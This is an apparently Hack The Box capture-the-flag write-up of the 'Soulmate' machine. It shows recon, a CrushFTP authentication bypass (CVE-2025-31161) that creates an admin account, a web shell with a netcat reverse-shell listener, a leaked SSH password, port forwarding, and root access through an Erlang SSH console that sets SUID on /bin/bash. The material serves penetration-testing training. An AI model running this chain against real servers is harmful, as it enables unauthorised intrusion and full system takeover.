---
title: Soulmate HTB-Writeup
date: 2026-02-17 18:49 +0100
categories: [Writeups, Easy]
tags: [Linux, CVE-2025-31161, WebApp, RCE, Port Forwarding, SSH]
---

```shell
sudo nmap -p- -sSVC --open --min-rate 7000 -v -n -Pn 10.129.132.160 -oN Ports.txt
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://soulmate.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```shell
wfuzz -u http://soulmate.htb -H "Host: FUZZ.soulmate.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hl 7
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://soulmate.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                      
=====================================================================

000000003:   302        0 L      0 W        0 Ch        "ftp" 
```

Exploit: https://github.com/0xgh057r3c0n/CVE-2025-31161

```shell
python3 CVE-2025-31161.py --target_host ftp.soulmate.htb --port 80 --new_user cibaism --password Password123


         
_____________   _______________         _______________   ________   .________         ________  ____ ____  ____________ 
\_   ___ \   \ /   /\_   _____/         \_____  \   _  \  \_____  \  |   ____/         \_____  \/_   /_   |/  _____/_   |
/    \  \/\   Y   /  |    __)_   ______  /  ____/  /_\  \  /  ____/  |____  \   ______   _(__  < |   ||   /   __  \ |   |
\     \____\     /   |        \ /_____/ /       \  \_/   \/       \  /       \ /_____/  /       \|   ||   \  |__\  \|   |
 \______  / \___/   /_______  /         \_______ \_____  /\_______ \/______  /         /______  /|___||___|\_____  /|___|
        \/                  \/                  \/     \/         \/       \/                 \/                 \/      


Author: Gaurav Bhattacharjee (G4UR4V007)

CVE-2025-31161 - CrushFTP User Creation Authentication Bypass Exploit
Description:
This vulnerability allows an attacker to create a new user account on CrushFTP
without proper authentication by sending crafted XML payloads to the WebInterface.
This can lead to unauthorized access and potential full compromise of the server.



[+] Preparing Payloads
  [-] Warming up the target...
  [-] Warm-up returned status code 502
[+] Sending Account Create Request
  [!] User created successfully!

[+] Exploit Complete! You can now login with:
   [*] Username: admin
   [*] Password: Password123

```

Dar permisos de upload y subir una shell.
<img width="1553" height="508" alt="image" src="https://github.com/user-attachments/assets/e1c31520-7d7c-47e7-8a0f-5c343ba5f540" />

<img width="1556" height="505" alt="image" src="https://github.com/user-attachments/assets/1661ed07-5820-4431-ab4a-902234560916" />

<img width="1150" height="160" alt="image" src="https://github.com/user-attachments/assets/af68842c-1e50-4965-9102-4782e8369921" />

```shell
nc -lnvp 6969
listening on [any] 6969 ...
connect to [10.10.14.105] from (UNKNOWN) [10.129.132.160] 37956
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

```shell
www-data@soulmate:/usr/local/lib/erlang_login$ cat start.escript 
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.

```

```
ben / HouseH0ldings998
```

```shell
ssh ben@soulmate.htb
ben@soulmate.htb's password: 
Last login: Sat Sep 6 20:44:38 2025 from 10.10.14.105
ben@soulmate:~$ ss -lt
State         Recv-Q        Send-Q               Local Address:Port                   Peer Address:Port        Process        
LISTEN        0             4096                     127.0.0.1:33477                       0.0.0.0:*                          
LISTEN        0             511                        0.0.0.0:http                        0.0.0.0:*                          
LISTEN        0             128                        0.0.0.0:ssh                         0.0.0.0:*                          
LISTEN        0             4096                     127.0.0.1:9090                        0.0.0.0:*                          
LISTEN        0             5                        127.0.0.1:2222                        0.0.0.0:*                          
LISTEN        0             4096                     127.0.0.1:8443                        0.0.0.0:*                          
LISTEN        0             4096                     127.0.0.1:epmd                        0.0.0.0:*                          
LISTEN        0             4096                 127.0.0.53%lo:domain                      0.0.0.0:*                          
LISTEN        0             4096                     127.0.0.1:http-alt                    0.0.0.0:*                          
LISTEN        0             128                      127.0.0.1:42173                       0.0.0.0:*                          
LISTEN        0             511                           [::]:http                           [::]:*                          
LISTEN        0             128                           [::]:ssh                            [::]:*                          
LISTEN        0             4096                         [::1]:epmd                           [::]:* 
```

```shell
sshpass -p 'HouseH0ldings998' ssh ben@soulmate.htb -L 2222:127.0.0.1:2222
Last login: Sat Sep 6 20:56:17 2025 from 10.10.14.105
ben@soulmate:~$ 
```

```shell
sshpass -p 'HouseH0ldings998' ssh ben@127.0.0.1 -p 2222
(ssh_runner@soulmate)2> os:cmd("cat /root/root.txt").
"79d8eec8c8d91c10fd7bc9c49ae3e0f6\n"

(ssh_runner@soulmate)4> os:cmd("chmod u+s /bin/bash").
[]
```

```shell
ben@soulmate:/opt$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1#
```
